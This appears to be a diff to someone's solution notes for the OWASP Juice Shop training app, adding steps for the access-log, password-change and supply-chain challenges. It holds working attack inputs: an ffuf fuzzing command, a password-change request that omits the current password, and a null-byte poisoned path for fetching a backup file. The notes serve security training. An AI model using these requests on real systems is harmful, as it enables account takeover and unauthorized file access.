@@ -320,11 +320,20 @@ email:bender@juice-sh.op<br>
 secret:Stop'n'Drop<br>
 
 ### Access logs
-bash > ffuf -w /usr/share/wordlists/dirb/common.txt -u http://localhost:3000/support/FUZZ -fs 1987
-http://localhost:3000/support/Logs
+bash > ffuf -w /usr/share/wordlists/dirb/common.txt -u http://localhost:3000/support/FUZZ -fs 1987<br>
+http://localhost:3000/support/Logs<br>
 
+### Change Bender's password
+http://localhost:3000/#/privacy-security/change-password<br>
+burp suite > proxy > repeater <br>
+GET /rest/user/change-password?current=&new=slurmCl4ssic&repeat=slurmCl4ssic HTTP/1.1<br>
 
-
+### Supply chain attack
+http://localhost:3000/ftp<br>
+GET /ftp/package.json.bak%2500.md HTTP/1.1<br>
+eslint-scope 3.7.2<br>
+http://localhost:3000/#/contact<br>
+comment:https://github.com/eslint/eslint-scope/issues/39<br>
 
 
 
